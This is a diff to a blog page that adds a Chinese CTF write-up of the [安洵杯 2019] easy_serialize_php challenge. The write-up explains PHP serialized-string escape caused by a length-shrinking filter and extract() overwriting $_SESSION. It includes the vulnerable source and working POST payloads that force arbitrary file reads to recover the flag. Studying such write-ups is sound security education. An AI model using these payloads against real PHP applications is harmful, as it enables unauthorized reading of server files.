@@ -3268,6 +3268,251 @@
     <div class="md-post__meta md-meta">
       <ul class="md-meta__list">
         <li class="md-meta__item">
+          <time datetime="2026-11-03 20:40:00+00:00">2026-11-03</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="../php/" class="md-meta__link">PHP</a>, 
+              <a href="../%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-meta__link">反序列化</a>, 
+              <a href="./" class="md-meta__link">代码审计</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 3 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="2019-easy_serialize_php"><a class="toclink" href="../../anxunbei2019-easy-serialize-php/">[安洵杯 2019] easy_serialize_php — 长度声明是过滤前算的</a></h2>
+<blockquote>
+<p><strong>题目类型</strong>：PHP 反序列化 — 序列化字符串逃逸（长度变化）</p>
+<p><strong>Flag</strong>：<code>CTF2{dad89ab0-9990-4063-bc5a-fabbcc9cb29e}</code></p>
+</blockquote>
+<hr />
+<h3 id="_1"><a class="toclink" href="../../anxunbei2019-easy-serialize-php/#_1">题目概述</a></h3>
+<p>页面就一句 <code>source_code</code> 链接，点进去是源码。这题的坑不在链子，在<strong>长度</strong>。</p>
+<hr />
+<h3 id="_2"><a class="toclink" href="../../anxunbei2019-easy-serialize-php/#_2">解题过程</a></h3>
+<h4 id="step-1-sink"><a class="toclink" href="../../anxunbei2019-easy-serialize-php/#step-1-sink">Step 1：读源码，先找 sink</a></h4>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a><span class="x">function filter($img){</span>
+</span><span id="__span-76-2"><a id="__codelineno-76-2" name="__codelineno-76-2" href="#__codelineno-76-2"></a><span class="x">    $filter_arr = array('php','flag','php5','php4','fl1g');</span>
+</span><span id="__span-76-3"><a id="__codelineno-76-3" name="__codelineno-76-3" href="#__codelineno-76-3"></a><span class="x">    $filter = '/'.implode('|',$filter_arr).'/i';</span>
+</span><span id="__span-76-4"><a id="__codelineno-76-4" name="__codelineno-76-4" href="#__codelineno-76-4"></a><span class="x">    return preg_replace($filter,'',$img);</span>
+</span><span id="__span-76-5"><a id="__codelineno-76-5" name="__codelineno-76-5" href="#__codelineno-76-5"></a><span class="x">}</span>
+</span><span id="__span-76-6"><a id="__codelineno-76-6" name="__codelineno-76-6" href="#__codelineno-76-6"></a>
+</span><span id="__span-76-7"><a id="__codelineno-76-7" name="__codelineno-76-7" href="#__codelineno-76-7"></a><span class="x">$_SESSION["user"] = 'guest';</span>
+</span><span id="__span-76-8"><a id="__codelineno-76-8" name="__codelineno-76-8" href="#__codelineno-76-8"></a><span class="x">$_SESSION['function'] = $function;</span>
+</span><span id="__span-76-9"><a id="__codelineno-76-9" name="__codelineno-76-9" href="#__codelineno-76-9"></a><span class="x">extract($_POST);</span>
+</span><span id="__span-76-10"><a id="__codelineno-76-10" name="__codelineno-76-10" href="#__codelineno-76-10"></a>
+</span><span id="__span-76-11"><a id="__codelineno-76-11" name="__codelineno-76-11" href="#__codelineno-76-11"></a><span class="x">if(!$_GET['img_path']){</span>
+</span><span id="__span-76-12"><a id="__codelineno-76-12" name="__codelineno-76-12" href="#__codelineno-76-12"></a><span class="x">    $_SESSION['img'] = base64_encode('guest_img.png');</span>
+</span><span id="__span-76-13"><a id="__codelineno-76-13" name="__codelineno-76-13" href="#__codelineno-76-13"></a><span class="x">}else{</span>
+</span><span id="__span-76-14"><a id="__codelineno-76-14" name="__codelineno-76-14" href="#__codelineno-76-14"></a><span class="x">    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));</span>
+</span><span id="__span-76-15"><a id="__codelineno-76-15" name="__codelineno-76-15" href="#__codelineno-76-15"></a><span class="x">}</span>
+</span><span id="__span-76-16"><a id="__codelineno-76-16" name="__codelineno-76-16" href="#__codelineno-76-16"></a>
+</span><span id="__span-76-17"><a id="__codelineno-76-17" name="__codelineno-76-17" href="#__codelineno-76-17"></a><span class="x">$serialize_info = filter(serialize($_SESSION));</span>
+</span><span id="__span-76-18"><a id="__codelineno-76-18" name="__codelineno-76-18" href="#__codelineno-76-18"></a>
+</span><span id="__span-76-19"><a id="__codelineno-76-19" name="__codelineno-76-19" href="#__codelineno-76-19"></a><span class="x">if($function == 'highlight_file'){</span>
+</span><span id="__span-76-20"><a id="__codelineno-76-20" name="__codelineno-76-20" href="#__codelineno-76-20"></a><span class="x">    highlight_file('index.php');</span>
+</span><span id="__span-76-21"><a id="__codelineno-76-21" name="__codelineno-76-21" href="#__codelineno-76-21"></a><span class="x">}else if($function == 'phpinfo'){</span>
+</span><span id="__span-76-22"><a id="__codelineno-76-22" name="__codelineno-76-22" href="#__codelineno-76-22"></a><span class="x">    eval('phpinfo();');</span>
+</span><span id="__span-76-23"><a id="__codelineno-76-23" name="__codelineno-76-23" href="#__codelineno-76-23"></a><span class="x">}else if($function == 'show_image'){</span>
+</span><span id="__span-76-24"><a id="__codelineno-76-24" name="__codelineno-76-24" href="#__codelineno-76-24"></a><span class="x">    $userinfo = unserialize($serialize_info);</span>
+</span><span id="__span-76-25"><a id="__codelineno-76-25" name="__codelineno-76-25" href="#__codelineno-76-25"></a><span class="x">    echo file_get_contents(base64_decode($userinfo['img']));</span>
+</span><span id="__span-76-26"><a id="__codelineno-76-26" name="__codelineno-76-26" href="#__codelineno-76-26"></a><span class="x">}</span>
+</span></code></pre></div>
+<p><strong>能读文件的是 <code>show_image</code> 分支：</strong></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a><span class="x">$userinfo = unserialize($serialize_info);</span>
+</span><span id="__span-77-2"><a id="__codelineno-77-2" name="__codelineno-77-2" href="#__codelineno-77-2"></a><span class="x">echo file_get_contents(base64_decode($userinfo['img']));</span>
+</span></code></pre></div>
+<p><strong>所以目标是：让 <code>$userinfo['img']</code> 等于</strong>某个文件路径的 base64<strong>。</strong></p>
+<h4 id="step-2-img"><a class="toclink" href="../../anxunbei2019-easy-serialize-php/#step-2-img">Step 2：为什么不能直接改 img</a></h4>
+<p><strong><code>$_SESSION['img']</code> 在两个分支里都被无条件赋值，而且是在 <code>extract($_POST)</code> <strong>之后</strong>：</strong></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a><span class="x">if(!$_GET['img_path']){</span>
+</span><span id="__span-78-2"><a id="__codelineno-78-2" name="__codelineno-78-2" href="#__codelineno-78-2"></a><span class="x">    $_SESSION['img'] = base64_encode('guest_img.png');</span>
+</span><span id="__span-78-3"><a id="__codelineno-78-3" name="__codelineno-78-3" href="#__codelineno-78-3"></a><span class="x">}else{</span>
+</span><span id="__span-78-4"><a id="__codelineno-78-4" name="__codelineno-78-4" href="#__codelineno-78-4"></a><span class="x">    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));</span>
+</span><span id="__span-78-5"><a id="__codelineno-78-5" name="__codelineno-78-5" href="#__codelineno-78-5"></a><span class="x">}</span>
+</span></code></pre></div>
+<p><strong>所以你 POST 里传的 <code>img</code> 会被覆盖掉；<code>sha1()</code> 的输出又永远是 40 位十六进制，</strong>注入不进去任何结构<strong>。</strong></p>
+<p><strong>这条路封死。真正的入口是 <code>filter()</code>——它会把序列化串里的 <code>php</code>、<code>flag</code> 删掉。</strong></p>
+<h4 id="step-3"><a class="toclink" href="../../anxunbei2019-easy-serialize-php/#step-3">Step 3：错位从这里开始</a></h4>
+<p><strong><code>serialize()</code> 里的长度声明是</strong>按过滤前的内容算<strong>的，但 <code>filter()</code> 之后内容变短了：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a>序列化：s:7:"phpflag";     ← 声明读 7 个字节
+</span><span id="__span-79-2"><a id="__codelineno-79-2" name="__codelineno-79-2" href="#__codelineno-79-2"></a>过滤后：s:7:"";            ← 内容被删光，0 个字节
+</span></code></pre></div>
+<p><strong>解析器不会报错，它按规则</strong>从引号后面数 7 个字节<strong>——数到的是后面那段内容。</strong></p>
+<p><strong>这就是“逃逸”：长度声明和实际内容不匹配，解析器多读的那部分，变成了下一个结构。</strong></p>
+<h4 id="step-4-payload"><a class="toclink" href="../../anxunbei2019-easy-serialize-php/#step-4-payload">Step 4：我把 payload 放错了位置（三次错）</a></h4>
+<p><strong>① 填充放在</strong>值<strong>里——废</strong></p>
+<p><strong>我把 <code>php</code> 重复十几次塞进 <code>user</code> 的值里，想让 filter 删掉它们。</strong>结果：**</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1" href="#__codelineno-80-1"></a>过滤前: s:4:"user";s:89:"guestphpphp…php";}s:3:"img";…"
+</span><span id="__span-80-2"><a id="__codelineno-80-2" name="__codelineno-80-2" href="#__codelineno-80-2"></a>过滤后: s:4:"user";s:89:"guest";}s:3:"img";…"
+</span><span id="__span-80-3"><a id="__codelineno-80-3" name="__codelineno-80-3" href="#__codelineno-80-3"></a>                     └ 声明 89，实际只剩 47 ┘
+</span></code></pre></div>
+<p><strong>解析器从 <code>guest</code> 往后数 89 个字节，把我写的 <code>";}s:3:"img";...</code> <strong>全算进了 user 的值里</strong>——我写的结构一次都没被当成结构，只是被当成字符。<code>unserialize</code> 返回 <code>false</code>。</strong></p>
+<p><strong>② 填充放在</strong>键名<strong>里——对</strong></p>
+<p><strong>键名的写法也是 <code>s:N:"键名"</code>，同样有长度声明，同样会被删：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1" href="#__codelineno-81-1"></a>过滤前: s:7:"phpflag";s:48:";s:1:"1";s:3:"img";s:20:"ZDBn…";}"
+</span><span id="__span-81-2"><a id="__codelineno-81-2" name="__codelineno-81-2" href="#__codelineno-81-2"></a>过滤后: s:7:"";s:48:";s:1:"1";s:3:"img";s:20:"ZDBn…";}"
+</span></code></pre></div>
+<p><strong>这次断的是</strong>键名和值的交界处<strong>，值本身是完整的。解析器从值里借 7 个字节当键名，剩下的部分就变成了</strong>新的结构<strong>。</strong></p>
+<p><strong>③ 还手写过整条序列化串——那也是错的</strong></p>
+<p><strong>这题</strong>不需要你写序列化串<strong>。<code>serialize($_SESSION)</code> 是服务器自己做的。我一开始写成这样：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1" href="#__codelineno-82-1"></a>O:7:"Session":3:{s:4:"user";…}
+</span></code></pre></div>
+<p><strong>两个问题：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-83-1"><a id="__codelineno-83-1" name="__codelineno-83-1" href="#__codelineno-83-1"></a>O: 是对象格式，$_SESSION 是数组，应该是 a:
+</span><span id="__span-83-2"><a id="__codelineno-83-2" name="__codelineno-83-2" href="#__codelineno-83-2"></a>没有 Session 这个类 → 变成 __PHP_Incomplete_Class → 后面不能当数组用
+</span></code></pre></div>
+<p><strong>你的 payload 只是 POST 里的</strong>一个字符串值<strong>。</strong></p>
+<h4 id="step-5"><a class="toclink" href="../../anxunbei2019-easy-serialize-php/#step-5">Step 5：参数名也写错了</a></h4>
+<p><strong>我写的是 <code>$_SESSION['flag']=...</code>——这是 PHP 语法，不是 HTTP 参数名。</strong></p>
+<p><strong>HTTP 里要写：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-84-1"><a id="__codelineno-84-1" name="__codelineno-84-1" href="#__codelineno-84-1"></a>_SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
+</span></code></pre></div>
+<p><strong>注意这里没有 <code>$</code>、没有单引号。</strong></p>
+<h4 id="step-6-2"><a class="toclink" href="../../anxunbei2019-easy-serialize-php/#step-6-2">Step 6：一个意外发现——数组只剩 2 个元素</a></h4>
+<p><strong><code>extract($_POST)</code> 把 <code>_POST['_SESSION']</code> 这个</strong>数组<strong>整体赋给了 <code>$_SESSION</code>，</strong>不是往里面加键，而是整个替换掉<strong>。</strong></p>
+<p><strong>所以服务器真正的序列化串是：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-85-1"><a id="__codelineno-85-1" name="__codelineno-85-1" href="#__codelineno-85-1"></a>a:2:{s:7:"phpflag";s:48:";s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
+</span></code></pre></div>
+<p><strong>只有 2 个元素：我的键 + img。<code>user</code> 和 <code>function</code> 已经不存在了。</strong></p>
+<p><strong>这也解释了那个 <code>;s:1:"1";</code> 是干什么的——占一个元素的位置，让解析出来的元素数正好等于 <code>a:2:</code> 声明的 2 个。</strong></p>
+<h4 id="step-7"><a class="toclink" href="../../anxunbei2019-easy-serialize-php/#step-7">Step 7：逐字节看解析过程</a></h4>
+<p><strong>过滤后的串：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-86-1"><a id="__codelineno-86-1" name="__codelineno-86-1" href="#__codelineno-86-1"></a>a:2:{s:7:"";s:48:";s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
+</span></code></pre></div>
+<p><strong>解析器这样走：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-87-1"><a id="__codelineno-87-1" name="__codelineno-87-1" href="#__codelineno-87-1"></a>① a:2:{                    → 要读 2 组键值对
+</span><span id="__span-87-2"><a id="__codelineno-87-2" name="__codelineno-87-2" href="#__codelineno-87-2"></a>② 读第 1 组的键:  s:7  →  从引号后数 7 个字节 = '";s:48:'
+</span><span id="__span-87-3"><a id="__codelineno-87-3" name="__codelineno-87-3" href="#__codelineno-87-3"></a>③ 读第 1 组的值:  s:1  →  读 1 个字节 = '1'
+</span><span id="__span-87-4"><a id="__codelineno-87-4" name="__codelineno-87-4" href="#__codelineno-87-4"></a>④ 读第 2 组的键:  s:3  →  'img'
+</span><span id="__span-87-5"><a id="__codelineno-87-5" name="__codelineno-87-5" href="#__codelineno-87-5"></a>⑤ 读第 2 组的值:  s:20 →  'ZDBnM19mMWFnLnBocA=='
+</span><span id="__span-87-6"><a id="__codelineno-87-6" name="__codelineno-87-6" href="#__codelineno-87-6"></a>⑥ 读到 '}'，结束。后面那段"真正的 img"被丢弃
+</span></code></pre></div>
+<p><strong>最终：<code>$userinfo['img'] = 'ZDBnM19mMWFnLnBocA=='</code>。</strong></p>
+<p><strong>第一步最关键：<code>phpflag</code> 被删光，但 <code>s:7</code> 的声明还在，解析器不会“觉得不对”，它只是从下一个字节开始数 7 个。</strong></p>
+<h4 id="step-8"><a class="toclink" href="../../anxunbei2019-easy-serialize-php/#step-8">Step 8：读文件</a></h4>
+<p><strong><code>ZDBnM19mMWFnLnBocA==</code> 解出来是 <code>d0g3_f1ag.php</code>：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-88-1"><a id="__codelineno-88-1" name="__codelineno-88-1" href="#__codelineno-88-1"></a>file_get_contents(base64_decode('ZDBnM19mMWFnLnBocA=='))
+</span><span id="__span-88-2"><a id="__codelineno-88-2" name="__codelineno-88-2" href="#__codelineno-88-2"></a>→ &lt;?php $flag = 'flag in /d0g3_fllllllag'; ?&gt;
+</span></code></pre></div>
+<p><strong>真正的 flag 在 <code>/d0g3_fllllllag</code>，重新算 base64：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-89-1"><a id="__codelineno-89-1" name="__codelineno-89-1" href="#__codelineno-89-1"></a>/d0g3_fllllllag  →  L2QwZzNfZmxsbGxsbGFn
+</span></code></pre></div>
+<p><strong>再发一次：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-90-1"><a id="__codelineno-90-1" name="__codelineno-90-1" href="#__codelineno-90-1"></a>POST _SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
+</span><span id="__span-90-2"><a id="__codelineno-90-2" name="__codelineno-90-2" href="#__codelineno-90-2"></a>GET  ?f=show_image
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-91-1"><a id="__codelineno-91-1" name="__codelineno-91-1" href="#__codelineno-91-1"></a>CTF2{dad89ab0-9990-4063-bc5a-fabbcc9cb29e}
+</span></code></pre></div>
+<hr />
+<h3 id="_3"><a class="toclink" href="../../anxunbei2019-easy-serialize-php/#_3">解题思路总结</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-92-1"><a id="__codelineno-92-1" name="__codelineno-92-1" href="#__codelineno-92-1"></a>读源码 → sink 在 show_image：unserialize + base64_decode + file_get_contents
+</span><span id="__span-92-2"><a id="__codelineno-92-2" name="__codelineno-92-2" href="#__codelineno-92-2"></a>       → img 被代码无条件覆盖，注入不进去
+</span><span id="__span-92-3"><a id="__codelineno-92-3" name="__codelineno-92-3" href="#__codelineno-92-3"></a>         → 突破口：filter 会删 php/flag，让长度声明和内容不匹配
+</span><span id="__span-92-4"><a id="__codelineno-92-4" name="__codelineno-92-4" href="#__codelineno-92-4"></a>           → 填充放在"值"里 → 解析器把后面的结构一起吞掉（失败）
+</span><span id="__span-92-5"><a id="__codelineno-92-5" name="__codelineno-92-5" href="#__codelineno-92-5"></a>             → 填充放在"键名"里 → 断点落在键名/值交界，落点可控（成功）
+</span><span id="__span-92-6"><a id="__codelineno-92-6" name="__codelineno-92-6" href="#__codelineno-92-6"></a>               → 补一个假元素 ;s:1:"1"; 让元素数对上 a:2
+</span><span id="__span-92-7"><a id="__codelineno-92-7" name="__codelineno-92-7" href="#__codelineno-92-7"></a>                 → 读出 d0g3_f1ag.php → 里面写着真实路径 → 再来一次
+</span></code></pre></div>
+<h4 id="_4"><a class="toclink" href="../../anxunbei2019-easy-serialize-php/#_4">漏洞原理</a></h4>
+<p><strong>① 长度声明是“过滤前”算的</strong></p>
+<p><strong><code>serialize()</code> 生成的 <code>s:N:"..."</code> 是按当时内容的长度算的；<code>filter()</code> 改了内容，<code>N</code> 却不会变。</strong></p>
+<p><strong>解析器只认 <code>N</code>：它从引号后精确数 <code>N</code> 个字节。</strong>内容短了，它就多读到后面的东西——<strong>多读的部分被当成新结构。</strong></p>
+<p><strong>② 错位点在哪，决定了你能不能控制</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-93-1"><a id="__codelineno-93-1" name="__codelineno-93-1" href="#__codelineno-93-1"></a>填充在值里   →  值本身断裂，后面全被当字符吞掉  →  不可控
+</span><span id="__span-93-2"><a id="__codelineno-93-2" name="__codelineno-93-2" href="#__codelineno-93-2"></a>填充在键名里 →  值完整，断点落在"键名结束 → 值开始"  →  可控
+</span></code></pre></div>
+<p><strong>③ <code>extract()</code> 同名会整体替换</strong></p>
+<p><strong><code>_POST['_SESSION']</code> 是数组，<code>extract</code> 会把它整个赋给 <code>$_SESSION</code>，</strong>不是合并<strong>。</strong>所以 <code>user</code>、<code>function</code> 消失了，数组只剩你的键和 <code>img</code>。**</p>
+<p><strong>这也是为什么 <code>a:2</code>——不是 3。</strong></p>
+<h4 id="_5"><a class="toclink" href="../../anxunbei2019-easy-serialize-php/#_5">关键知识点</a></h4>
+<table>
+<thead>
+<tr>
+<th>知识点</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>序列化逃逸</td>
+<td><code>s:N:"..."</code> 的 <code>N</code> 是过滤前算的，内容变短后解析器会多读</td>
+</tr>
+<tr>
+<td>填充位置</td>
+<td>放键名可控，放值里会把你的结构一起吞掉</td>
+</tr>
+<tr>
+<td><code>;s:1:"1";</code></td>
+<td>假元素，用来把元素数凑回 <code>a:N</code> 声明的数量</td>
+</tr>
+<tr>
+<td>元素数必须对上</td>
+<td>解析出来的键值对数与 <code>a:N</code> 不符 → <code>unserialize</code> 返回 false</td>
+</tr>
+<tr>
+<td><code>extract()</code></td>
+<td>同名键是<strong>整体替换</strong>，不是合并</td>
+</tr>
+<tr>
+<td>数组 vs 对象</td>
+<td><code>$_SESSION</code> 是数组用 <code>a:</code>，<code>O:</code> 是对象，混用会变 <code>__PHP_Incomplete_Class</code></td>
+</tr>
+<tr>
+<td>HTTP 参数写法</td>
+<td><code>_SESSION[键]=值</code>，不写 <code>$</code>、不写引号</td>
+</tr>
+<tr>
+<td>二次读取</td>
+<td>读到的文件里可能还写着真正的 flag 路径</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<details class="note">
+<summary>完整 payload</summary>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-94-1"><a id="__codelineno-94-1" name="__codelineno-94-1" href="#__codelineno-94-1"></a>GET  /index.php?f=show_image
+</span><span id="__span-94-2"><a id="__codelineno-94-2" name="__codelineno-94-2" href="#__codelineno-94-2"></a>
+</span><span id="__span-94-3"><a id="__codelineno-94-3" name="__codelineno-94-3" href="#__codelineno-94-3"></a>POST _SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
+</span><span id="__span-94-4"><a id="__codelineno-94-4" name="__codelineno-94-4" href="#__codelineno-94-4"></a>→ 返回 d0g3_f1ag.php 的内容：$flag = 'flag in /d0g3_fllllllag';
+</span><span id="__span-94-5"><a id="__codelineno-94-5" name="__codelineno-94-5" href="#__codelineno-94-5"></a>
+</span><span id="__span-94-6"><a id="__codelineno-94-6" name="__codelineno-94-6" href="#__codelineno-94-6"></a>POST _SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
+</span><span id="__span-94-7"><a id="__codelineno-94-7" name="__codelineno-94-7" href="#__codelineno-94-7"></a>→ CTF2{dad89ab0-9990-4063-bc5a-fabbcc9cb29e}
+</span></code></pre></div>
+</details>
+<details class="note">
+<summary>这题踩的坑</summary>
+<p><strong>① 填充放在值里</strong></p>
+<p>最常见的错。<strong>看起来"filter 会删掉填充，所以后面就对齐了"——恰恰相反：填充被删掉只会让声明比内容更长，多出来的长度把后面的一切都吃掉。</strong></p>
+<p><strong>② 手写整条序列化串</strong></p>
+<p><strong>这题服务器自己 <code>serialize()</code>，你交的只是一个值。</strong>行首的 <code>a:2:</code> 是它数出来的，不是你写的。</p>
+<p><strong>③ <code>$_SESSION['flag']=</code> 当参数名</strong></p>
+<p><strong>那是 PHP 语法。HTTP 里是 <code>_SESSION[flag]=</code>。</strong></p>
+<p><strong>④ 以为数组有 3 个元素</strong></p>
+<p><strong><code>extract</code> 是整体替换，<code>user</code>/<code>function</code> 早没了，只剩 2 个。</strong></p>
+</details>
+    
+    
+  </div>
+</article>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
           <time datetime="2026-11-03 19:05:00+00:00">2026-11-03</time></li>
         
           <li class="md-meta__item">
